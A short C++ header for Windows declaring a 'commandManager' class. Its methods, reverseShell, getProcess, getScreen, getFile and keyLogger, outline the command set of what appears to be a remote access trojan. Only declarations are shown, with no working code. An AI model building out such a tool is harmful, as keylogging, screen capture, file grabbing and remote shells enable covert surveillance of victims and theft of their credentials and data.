#pragma once
#include <string>
#include <Windows.h>


class commandManager
{
//private:
	

public:
	ULONG64 screen_len = 0;
	ULONG64 file_len = 0;
	commandManager();
	std::string reverseShell(std::string cmd);
	void getProcess();
	LPVOID getScreen();
	void getFile(std::string& path);
	void keyLogger();
};

